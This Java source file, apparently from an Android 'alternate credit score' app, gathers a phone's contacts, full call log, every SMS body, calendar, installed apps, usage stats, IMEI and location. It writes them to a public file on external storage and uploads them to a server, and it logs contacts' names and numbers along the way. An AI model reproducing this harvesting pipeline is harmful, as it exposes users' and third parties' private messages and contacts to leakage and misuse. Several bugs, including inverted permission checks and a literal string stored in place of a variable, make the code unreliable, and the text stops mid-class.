package com.rosemellow.alternatecreditscore;

import android.Manifest;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.text.format.DateUtils;
import android.util.ArrayMap;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import com.rosemellow.alternatecreditscore.HardwareSofftware.MemoryStatus;
import com.rosemellow.alternatecreditscore.VideoModule.VideoData;
import com.rosemellow.alternatecreditscore.simpleimagegallery.utils.imageFolder;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.text.CharacterIterator;
import java.text.DateFormat;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.text.StringCharacterIterator;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

import static android.Manifest.permission.READ_PHONE_STATE;
import static com.rosemellow.alternatecreditscore.SavePref.getMyPhoneNumber;

public class StartCommonFetchingActivity extends LocationActivity  {

    public static StringBuffer sbfinal = new StringBuffer();
    public ArrayList<VideoData> arrayList = new ArrayList<>();
    LinearLayout ll1, ll2;
    int i, j;
    private int seconds = 0;

    // Is the stopwatch running?
    private boolean running;
    private boolean wasRunning;
    String subString, folderName;
    Context mAppContext;
    ArrayList<String> path = new ArrayList<>();
    StringBuffer sbvideos = new StringBuffer();
    RetrofitService retrofitService;
    Button returnbutton;
    String mPhoneNumber;

    public static String humanReadableByteCountBin(long bytes) {
        long absB = bytes == Long.MIN_VALUE ? Long.MAX_VALUE : Math.abs(bytes);
        if (absB < 1024) {
            return bytes + " B";
        }
        long value = absB;
        CharacterIterator ci = new StringCharacterIterator("KMGTPE");
        for (int i = 40; i >= 0 && absB > 0xfffccccccccccccL >> i; i -= 10) {
            value >>= 10;
            ci.next();
        }
        value *= Long.signum(bytes);
        return String.format("%.1f %ciB", value / 1024.0, ci.current());
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_start_common_fetching);

        running = true;
        runTimer();
        //  TelephonyManager tMgr = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        TelephonyManager tMgr = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        if (savedInstanceState != null) {

            // Get the previous state of the stopwatch
            // if the activity has been
            // destroyed and recreated.
            seconds
                    = savedInstanceState
                    .getInt("seconds");
            running
                    = savedInstanceState
                    .getBoolean("running");
            wasRunning
                    = savedInstanceState
                    .getBoolean("wasRunning");
        }


        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {

            return;
        }
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            mPhoneNumber = tMgr.getLine1Number();
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            mPhoneNumber = tMgr.getLine1Number();
           /* List<SubscriptionInfo> subscription = SubscriptionManager.from(getApplicationContext()).getActiveSubscriptionInfoList();
            for (int i = 0; i < subscription.size(); i++) {
                SubscriptionInfo info = subscription.get(i);
                mPhoneNumber=info.getNumber();
                Log.e("TAG", "numberramesh " + info.getNumber());
                Log.e("TAG", "network name : " + info.getCarrierName());
                Log.e("TAG", "country iso " + info.getCountryIso());
            }*/
        }


        Log.e("rameshhhhhhh", mPhoneNumber);
        //  new SavePref(this).setMyPhoneNumber(mPhoneNumber);


        retrofitService = ApiBaseUrl.getClient().create(RetrofitService.class);


        ll1 = findViewById(R.id.ll1);
        ll2 = findViewById(R.id.ll2);
        returnbutton = findViewById(R.id.returnbutton);
        ll1.setVisibility(View.VISIBLE);
        ll2.setVisibility(View.GONE);

        returnbutton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent(StartCommonFetchingActivity.this, TermsandConditionsActivity.class));
            }
        });
        getHwSwInfor();
        getIMEIDeviceId(this);

    }


    // If the activity is paused,
    // stop the stopwatch.
    @Override
    protected void onPause()
    {
        super.onPause();
        wasRunning = running;
        running = false;
    }

    // If the activity is resumed,
    // start the stopwatch
    // again if it was running previously.
    @Override
    protected void onResume()
    {
        super.onResume();
        if (wasRunning) {
            running = true;
        }
    }
    public String getIMEIDeviceId(Context context) {

        String deviceId = null;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
        {
            deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        } else {
            final TelephonyManager mTelephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)  != PackageManager.PERMISSION_GRANTED) {
                    return "";
                }
            }
            assert mTelephony != null;

            if (mTelephony.getDeviceId() != null)
            {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                {
                    deviceId = mTelephony.getImei();
                }else {
                    deviceId = mTelephony.getDeviceId();
                }
            } else {
                deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            }

        }
        new SavePref(this).setMyIMEI("IMEI NUMBER Or DEVICE ID:"+deviceId);
        Log.d("deviceIdram", deviceId);
        return deviceId;
    }
    // Start the stopwatch running
    // when the Start button is clicked.
    // Below method gets called
    // when the Start button is clicked.
    public void onClickStart(View view)
    {
        running = true;
    }

    // Stop the stopwatch running
    // when the Stop button is clicked.
    // Below method gets called
    // when the Stop button is clicked.
    public void onClickStop(View view)
    {
        running = false;
    }

    // Reset the stopwatch when
    // the Reset button is clicked.
    // Below method gets called
    // when the Reset button is clicked.
    public void onClickReset(View view)
    {
        running = false;
        seconds = 0;
    }
    private void runTimer() {

        // Get the text view.
        final TextView timeView
                = (TextView) findViewById(
                R.id.time_view);

        // Creates a new Handler
        final Handler handler
                = new Handler();

        // Call the post() method,
        // passing in a new Runnable.
        // The post() method processes
        // code without a delay,
        // so the code in the Runnable
        // will run almost immediately.
        handler.post(new Runnable() {
            @Override

            public void run() {
                int hours = seconds / 3600;
                int minutes = (seconds % 3600) / 60;
                int secs = seconds % 60;

                // Format the seconds into hours, minutes,
                // and seconds.
                String time
                        = String
                        .format(Locale.getDefault(),
                                "%d:%02d:%02d", hours,
                                minutes, secs);

                // Set the text view text.
                timeView.setText(time);

                // If running is true, increment the
                // seconds variable.
                if (running) {
                    seconds++;
                }

                // Post the code again
                // with a delay of 1 second.
                handler.postDelayed(this, 500);
            }
        });
    }

    public void getHwSwInfor() {
        StringBuffer sb = new StringBuffer();

        sb.append("HARDWARE AND SOFTWARE INFORMATION" + "\n\n");
        sb.append("Device Name  Device Manufacturer  Device OS  Device Api Level  Device ID  RAM Size  Total Internal Memory  Available Internal Memory  Total External Memory  Available External Memory" + "\n\n");

        String deviceName = android.os.Build.MODEL;
        String deviceMan = android.os.Build.MANUFACTURER;
        String androidOS = Build.VERSION.RELEASE;
        String myAPI = Build.VERSION.SDK; // API Level
        String deviceID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);  //Device Id
        String RAMSize = getTotalRAM();


        sb.append(deviceName + ",  " + deviceMan + ",  " +
                androidOS + ",  " + myAPI + ",  " +
                deviceID + ",  " + RAMSize + ",  " +
                humanReadableByteCountBin(MemoryStatus.getTotalInternalMemorySize()) + ",  " + humanReadableByteCountBin(MemoryStatus.getAvailableInternalMemorySize()) + ",  " +
                humanReadableByteCountBin(MemoryStatus.getTotalExternalMemorySize()) + ",  " + humanReadableByteCountBin(MemoryStatus.getAvailableExternalMemorySize()) + ",  " +
                deviceName + ",  " + deviceMan + " " + "\n");

        new SavePref(this).setHardSoftInfo(sb.toString());
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {

                getContactList();

            }
        }, 1000);

    }


    //SMS INFO
    public void getAllSms() {
        StringBuffer sb = new StringBuffer();

        sb.append("SMS LOG" + "\n\n");
        sb.append("Number,  Message,  Type,  Time" + "\n\n");

        ContentResolver cr = StartCommonFetchingActivity.this.getContentResolver();
        Cursor c = cr.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        int totalSMS = 0;
        if (c != null) {
            totalSMS = c.getCount();

            Log.e("EFwsdcfdc", totalSMS + "");

            if (c.moveToFirst()) {
                for (int j = 0; j < totalSMS; j++) {
                    String smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE));
                    String number = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                    String body = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY));

                    Date dateFormat = new Date(Long.valueOf(smsDate));
                    String type = "";


                    switch (Integer.parseInt(c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                        case Telephony.Sms.MESSAGE_TYPE_INBOX:
                            type = "inbox";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_SENT:
                            type = "sent";
                            break;
                        case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                            type = "outbox";
                            break;
                        default:
                            break;
                    }


                    String currentDate = new SimpleDateFormat("dd MMM yyyy").format(dateFormat);
                    String currentTime = new SimpleDateFormat("hh:mm:ss").format(dateFormat);


                    sb.append(number + ",  " +
                            body + ",  " +
                            type + ",  " +
                            currentDate + " " + currentTime + "" +
                            "\n");


                    c.moveToNext();
                }
            }
            new SavePref(this).setSMSData(sb.toString());


            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {


                    readCalendarEvent();

                }
            }, 1000);


            c.close();

        } else {
            Toast.makeText(this, "No message to show!", Toast.LENGTH_SHORT).show();
        }


    }

    //CALENDER
    public void readCalendarEvent() {
        StringBuffer sb = new StringBuffer();
        sb.append("CALENDER" + "\n\n");


        sb.append("Event Name,  Event Date " + "\n\n");


        Cursor cursor = StartCommonFetchingActivity.this.getContentResolver()
                .query(
                        Uri.parse("content://com.android.calendar/events"),
                        new String[]{"calendar_id", "title", "description",
                                "dtstart", "dtend", "eventLocation"}, null,
                        null, null);
        cursor.moveToFirst();


        while (cursor.moveToNext()) {
            String phNumber = cursor.getString(1);
            String date = getDate(Long.parseLong(cursor.getString(3)));
            String desc = cursor.getString(2);


            sb.append(phNumber + ",  " +
                    date + ",  " +
                    "\n");


        }


        cursor.close();

        new SavePref(this).setCalenderEvents(sb.toString());


        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {


                try {
                    getPackageListAllApps();
                } catch (PackageManager.NameNotFoundException e) {
                    e.printStackTrace();
                }

            }
        }, 1000);


    }

    public String getDate(long milliSeconds) {
        SimpleDateFormat formatter = new SimpleDateFormat("dd MMM yyyy");
        Calendar calendar = Calendar.getInstance();
        calendar.setTimeInMillis(milliSeconds);
        return formatter.format(calendar.getTime());
    }

    //CALL HISTORY
    private void getCallDetails() {

        StringBuffer sb = new StringBuffer();

        sb.append("CALL LOG" + "\n\n");


        sb.append("Number,  Call Type,  Date,  Call duration,  Location" + "\n\n");


        Cursor managedCursor = managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int iso = managedCursor.getColumnIndex(CallLog.Calls.COUNTRY_ISO);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        int geocode = managedCursor.getColumnIndex(CallLog.Calls.GEOCODED_LOCATION);


        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number);
            String isoStr = managedCursor.getString(iso);
            String callType = managedCursor.getString(type);
            String callDate = managedCursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));
            String callDuration = managedCursor.getString(duration);
            String geocodeStr = managedCursor.getString(geocode);

            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
                case CallLog.Calls.BLOCKED_TYPE:
                    dir = "BLOCKED";
                    break;
                case CallLog.Calls.REJECTED_TYPE:
                    dir = "Rejected";
                   /* int number2 = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
                    String phNum2 = managedCursor.getString(number2);

                    String currentDate = new SimpleDateFormat("dd MMM yyyy").format(callDayTime);
                    String currentTime = new SimpleDateFormat("hh:mm:ss").format(callDayTime);


                    sb.append( phNum2 + ",  " +
                            callType + ",  " +
                            currentDate + " " + currentTime +
                            "\n");
                    Log.e("calllog_ramesh", String.valueOf(sb));
                    //managedCursor.close();
                    new SavePref(this).setCallLogData(sb.toString());*/
                    break;



            }

            if(dir==null){
                dir="BLOCKED";
            }


            String currentDate = new SimpleDateFormat("dd MMM yyyy").format(callDayTime);
            String currentTime = new SimpleDateFormat("hh:mm:ss").format(callDayTime);


            sb.append(isoStr + " " + phNumber + ",  " +
                    dir + ",  " +
                    currentDate + " " + currentTime + "" +
                    callDuration + ",  " +
                    geocodeStr + ",  " +
                    "\n");


        }


        managedCursor.close();
        new SavePref(this).setCallLogData(sb.toString());


        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {

                getAllSms();

            }
        }, 1000);


    }

    //CAT WISE APPS
    public void getPackageList() throws PackageManager.NameNotFoundException {

        StringBuffer sb = new StringBuffer();

        sb.append("CATEGORY WISE PHONE APPS" + "\n\n");


        sb.append("App Name,  App Category,  App Version,  App Package Name " + "\n\n");


        List installedPackages = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < installedPackages.size(); i++) {
            PackageInfo packageInfo = (PackageInfo) installedPackages.get(i);


            PackageManager pm = StartCommonFetchingActivity.this.getPackageManager();
            ApplicationInfo applicationInfo = pm.getApplicationInfo(packageInfo.packageName, 0);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                int appCategory = applicationInfo.category;
                String categoryTitle = (String) ApplicationInfo.getCategoryTitle(StartCommonFetchingActivity.this, appCategory);


                if (categoryTitle == null) {


                    sb.append(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString() + ",  " +
                            "Others" + ",  " +
                            packageInfo.versionName + ",  " +
                            packageInfo.packageName + ",  " +
                            "\n");

                } else {
                    Drawable d = packageInfo.applicationInfo.loadIcon(getPackageManager());

                    Log.e("FEfdasxdscNEW", categoryTitle + " " + packageInfo.packageName);


                    sb.append(packageInfo.applicationInfo.loadLabel(getPackageManager()).toString() + ",  " +
                            "categoryTitle" + ",  " +
                            packageInfo.versionName + ",  " +
                            packageInfo.packageName + ",  " +
                            "\n");

                }

            }


        }


        new SavePref(this).setCatWiseApps(sb.toString());


        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {


                getVideosFolderDatas();

            }
        }, 1000);
    }

    //CONTACTS LIST
    private void getContactList() {

        StringBuffer sb = new StringBuffer();

        sb.append("CONTACTS LIST" + "\n\n");


        sb.append("Name,  Phone Number " + "\n\n");
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur != null && cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));


                        Log.i("iduasknzx", "Name: " + name);
                        Log.i("iduasknzx", "Phone Number: " + phoneNo);


                        sb.append(name + ",  " +
                                phoneNo +
                                "\n");


                    }
                    pCur.close();
                }
            }
        }
        if (cur != null) {
            cur.close();
        }

        new SavePref(this).setContactsList(sb.toString());


        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {

                getCallDetails();

            }
        }, 1000);


    }


    public String getTotalRAM() {

        RandomAccessFile reader = null;
        String load = null;
        DecimalFormat twoDecimalForm = new DecimalFormat("#.##");
        double totRam = 0;
        String lastValue = "";
        try {
            reader = new RandomAccessFile("/proc/meminfo", "r");
            load = reader.readLine();

            // Get the Number value from the string
            Pattern p = Pattern.compile("(\\d+)");
            Matcher m = p.matcher(load);
            String value = "";
            while (m.find()) {
                value = m.group(1);
                // System.out.println("Ram : " + value);
            }
            reader.close();

            totRam = Double.parseDouble(value);
            // totRam = totRam / 1024;

            double mb = totRam / 1024.0;
            double gb = totRam / 1048576.0;
            double tb = totRam / 1073741824.0;

            if (tb > 1) {
                lastValue = twoDecimalForm.format(tb).concat(" TB");
            } else if (gb > 1) {
                lastValue = twoDecimalForm.format(gb).concat(" GB");
            } else if (mb > 1) {
                lastValue = twoDecimalForm.format(mb).concat(" MB");
            } else {
                lastValue = twoDecimalForm.format(totRam).concat(" KB");
            }


        } catch (IOException ex) {
            ex.printStackTrace();
        } finally {
            // Streams.close(reader);
        }

        return lastValue;
    }

    //ALL PHONE APPS
    public void getPackageListAllApps() throws PackageManager.NameNotFoundException {

        StringBuffer sb = new StringBuffer();

        sb.append("USER INSTALLED APPS" + "\n\n");


        sb.append("Category,  App Name" + "\n\n");

        List installedPackages = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < installedPackages.size(); i++) {
            PackageInfo packageInfo = (PackageInfo) installedPackages.get(i);


            PackageManager pm = StartCommonFetchingActivity.this.getPackageManager();
            ApplicationInfo applicationInfo = pm.getApplicationInfo(packageInfo.packageName, 0);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                int appCategory = applicationInfo.category;
                String categoryTitle = (String) ApplicationInfo.getCategoryTitle(StartCommonFetchingActivity.this, appCategory);

                Log.e("FEfdasxdsc", categoryTitle + " " + packageInfo.packageName);

                if (categoryTitle == null) {

                    sb.append("Others" + ",   " +
                            packageInfo.applicationInfo.loadLabel(getPackageManager()).toString() + "  " +
                            "\n");

                } else {
                    Log.e("FEfdasxdscNEW", categoryTitle + " " + packageInfo.packageName);


                    sb.append(categoryTitle + ",   " +
                            packageInfo.applicationInfo.loadLabel(getPackageManager()).toString() + "  " +
                            "\n");

                }

            }


        }

        new SavePref(this).setInstalledApps(sb.toString());

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {


                try {
                    getPackageList();
                } catch (PackageManager.NameNotFoundException e) {
                    e.printStackTrace();
                }

            }
        }, 1000);

    }


    public void getVideosFolderDatas() {

        sbvideos.append("FOLDER WISE VIDEOS" + "\n\n");


        sbvideos.append("Folder Name,  No. of Videos " + "\n\n");

        new getVideos(StartCommonFetchingActivity.this).execute();

    }

    public int getCountStr(String foldername) {

        ArrayList<VideoData> subArrayliat = new ArrayList<>();

        for (int i = 0; i < arrayList.size(); i++) {
            VideoData v = arrayList.get(i);
            if (v.getData().contains(foldername)) {
                subArrayliat.add(v);
            }

        }

        return subArrayliat.size();

    }

    private void getPicturePaths() {
        StringBuffer sb = new StringBuffer();

        sb.append("FOLDER WISE IMAGES" + "\n\n");


        sb.append("Folder Name,  No. of Images " + "\n\n");


        ArrayList<imageFolder> picFolders = new ArrayList<>();
        ArrayList<String> picPaths = new ArrayList<>();
        Uri allImagesuri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.ImageColumns.DATA, MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME, MediaStore.Images.Media.BUCKET_ID};
        Cursor cursor = this.getContentResolver().query(allImagesuri, projection, null, null, null);
        try {
            if (cursor != null) {
                cursor.moveToFirst();
            }
            do {
                imageFolder folds = new imageFolder();
                String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                String folder = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME));
                String datapath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));

                //String folderpaths =  datapath.replace(name,"");
                String folderpaths = datapath.substring(0, datapath.lastIndexOf(folder + "/"));
                folderpaths = folderpaths + folder + "/";
                if (!picPaths.contains(folderpaths)) {
                    picPaths.add(folderpaths);
                    folds.setPath(folderpaths);
                    folds.setFolderName(folder);
                    folds.setFirstPic(datapath);//if the folder has only one picture this line helps to set it as first so as to avoid blank image in itemview
                    folds.addpics();
                    picFolders.add(folds);

                } else {
                    for (int i = 0; i < picFolders.size(); i++) {
                        if (picFolders.get(i).getPath().equals(folderpaths)) {
                            picFolders.get(i).setFirstPic(datapath);
                            picFolders.get(i).addpics();
                        }
                    }
                }


            } while (cursor.moveToNext());
            cursor.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        for (int i = 0; i < picFolders.size(); i++) {

            Log.d("picture folders", picFolders.get(i).getFolderName() +
                    " and path = " + picFolders.get(i).getPath() + " " + picFolders.get(i).getNumberOfPics());


            sb.append(picFolders.get(i).getFolderName() + ",  " +
                    picFolders.get(i).getNumberOfPics() + "  " +
                    "\n");

        }


        new SavePref(StartCommonFetchingActivity.this).setImagesFolders(sb.toString());


        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {


                getAppUsage();

                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {

                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getLocation() + "\n\n");
                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getHardSoftInfo() + "\n\n");
                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getMyIMEI() + "\n\n");
                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getCallLogData() + "\n\n");
                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getSMSData() + "\n\n");
                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getCalenderEvents() + "\n\n");
                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getInstalledApps() + "\n\n");
                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getCatWiseApps() + "\n\n");
                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getAppUsage() + "\n\n");
                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getContactsList() + "\n\n");
                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getImagesFolders() + "\n\n");
                        sbfinal.append(new SavePref(StartCommonFetchingActivity.this).getVideosFolders() + "\n\n");
                        sbfinal.append("##Phase 2##"+ "\n\n");
                        sbfinal.append("Rejected call list"+" ,"+"Blocked call list"+","+"IMEI number or Device id"+","+"User mobile number"+ "\n\n");
                        Log.e("EFwdefdsaxzdcefdcx", new SavePref(StartCommonFetchingActivity.this).getLocation());

                        Log.e("EFwdefdcefdcx", new SavePref(StartCommonFetchingActivity.this).getAppUsage());

                        uploadFile();

                    }
                }, 6000);


            }
        }, 1000);

    }

    //APP USAGE
    public void getAppUsage() {
        UsageStatsAdapter();

    }

    public void UsageStatsAdapter() {
        final int _DISPLAY_ORDER_USAGE_TIME = 0;
        final ArrayMap<String, String> mAppLabelMap = new ArrayMap<>();
        final ArrayList<UsageStats> mPackageStats = new ArrayList<>();
        StringBuffer sb = new StringBuffer();
        UsageStatsManager mUsageStatsManager = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
        int mDisplayOrder = _DISPLAY_ORDER_USAGE_TIME;
        LastTimeUsedComparator mLastTimeUsedComparator = new LastTimeUsedComparator();
        UsageTimeComparator mUsageTimeComparator = new UsageTimeComparator();
        AppNameComparator mAppLabelComparator;
        PackageManager mPm = getPackageManager();


        Calendar cal = Calendar.getInstance();
        cal.add(Calendar.DAY_OF_YEAR, -5);

        sb.append("APP USAGE" + "\n\n");


        sb.append("App Name,  Last Used On,  Total Usage Time " + "\n\n");
        final List<UsageStats> stats =
                mUsageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_BEST,
                        cal.getTimeInMillis(), System.currentTimeMillis());
        if (stats == null) {
            return;
        }

        ArrayMap<String, UsageStats> map = new ArrayMap<>();
        final int statCount = stats.size();
        for (int i = 0; i < statCount; i++) {
            final android.app.usage.UsageStats pkgStats = stats.get(i);

            try {
                ApplicationInfo appInfo = mPm.getApplicationInfo(pkgStats.getPackageName(), 0);
                String label = appInfo.loadLabel(mPm).toString();
                mAppLabelMap.put(pkgStats.getPackageName(), label);

                UsageStats existingStats =
                        map.get(pkgStats.getPackageName());
                if (existingStats == null) {
                    map.put(pkgStats.getPackageName(), pkgStats);
                } else {
                    existingStats.add(pkgStats);
                }

            } catch (PackageManager.NameNotFoundException e) {

            }
        }
        mPackageStats.addAll(map.values());


        mAppLabelComparator = new AppNameComparator(mAppLabelMap);


        for (int pos = 0; pos < mPackageStats.size(); pos++) {

            UsageStats pkgStats = mPackageStats.get(pos);
            if (pkgStats != null) {

                Log.e("Fefcd", "here");

                sb.append(mAppLabelMap.get(pkgStats.getPackageName()) + ",  " +
                        ((DateUtils.formatSameDayTime(pkgStats.getLastTimeUsed(), System.currentTimeMillis(), DateFormat.MEDIUM, DateFormat.MEDIUM))) + ",  " +
                        DateUtils.formatElapsedTime(pkgStats.getTotalTimeInForeground() / 1000) + ",  " +
                        "\n");


            } else {

            }


            new SavePref(StartCommonFetchingActivity.this).setAppUsage(sb.toString());
        }


    }

    private void uploadFile() {

        File imagefile = generateNoteOnSD(StartCommonFetchingActivity.this,
                "PHONEDETAILS.tsv", StartCommonFetchingActivity.sbfinal.toString());

        RequestBody image = RequestBody.create(MediaType.parse("multipart/form-data"), imagefile);

        SimpleDateFormat postFormater = new SimpleDateFormat("MMMM_dd_yyyy_hh:mm:ss");

        String newDateStr = postFormater.format(new Date());


        MultipartBody.Part partImage = MultipartBody.Part.createFormData("csv_file",
                new SavePref(this).getMyPhoneNumber() + "_" + newDateStr + "_file" + ".tsv", image);

        ll2.setVisibility(View.VISIBLE);
        ll1.setVisibility(View.GONE);


        retrofitService.postUpdateCallWithImage(getRequestBody("abc"),
                partImage).enqueue(new Callback<UpdateModel>() {
            @Override
            public void onResponse(Call<UpdateModel> call, Response<UpdateModel> response) {

                try {
                    final UpdateModel registerModel = response.body();
                    UpdateDetailModel registerDetailModel = registerModel.getLoginDetailModels().get(0);

                    Log.e("FewcxesdxedsABC", registerDetailModel.getCsv_file() + " " + registerDetailModel.getMsg());


                    String stringYouExtracted = (String) registerDetailModel.getCsv_file();
                    ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                    ClipData clip = ClipData.newPlainText("label", stringYouExtracted);
                    clipboard.setPrimaryClip(clip);
                    Toast.makeText(StartCommonFetchingActivity.this, "Uploaded Text File Link to Clipboard", Toast.LENGTH_SHORT).show();

                    Toast.makeText(StartCommonFetchingActivity.this, "" + registerDetailModel.getMsg(), Toast.LENGTH_SHORT).show();
                    if (registerDetailModel.getSuccess().equalsIgnoreCase("1")) {

                        //startActivity(new Intent(StartCommonFetchingActivity.this, FinalActivity.class));

                        //finish();
                    } else {
                    }


                } catch (Exception e) {
                    Log.e("Fewcxesdxedsab", e.getMessage());


                }


            }

            @Override
            public void onFailure(Call<UpdateModel> call, Throwable t) {
                Log.e("Fewcxesdxeds", t.getMessage());
                t.printStackTrace();


            }
        });


    }

    public File generateNoteOnSD(Context context, String sFileName, String sBody) {
        File gpxfile = null;

        try {
            File root = new File(Environment.getExternalStorageDirectory(), "Notes");
            if (!root.exists()) {
                root.mkdirs();
            }
            gpxfile = new File(root, sFileName);
            FileWriter writer = new FileWriter(gpxfile);
            writer.append(sBody);
            writer.flush();
            writer.close();

        } catch (IOException e) {
            e.printStackTrace();
        }

        return gpxfile;

    }

    public RequestBody getRequestBody(String s) {
        RequestBody requestBody = RequestBody.create(MediaType.parse("multipart/form-data"), s);
        return requestBody;

    }

    public static class LastTimeUsedComparator implements Comparator<UsageStats> {
        @Override
        public final int compare(UsageStats a, UsageStats b) {
            return (int) (b.getLastTimeUsed() - a.getLastTimeUsed());
        }
    }

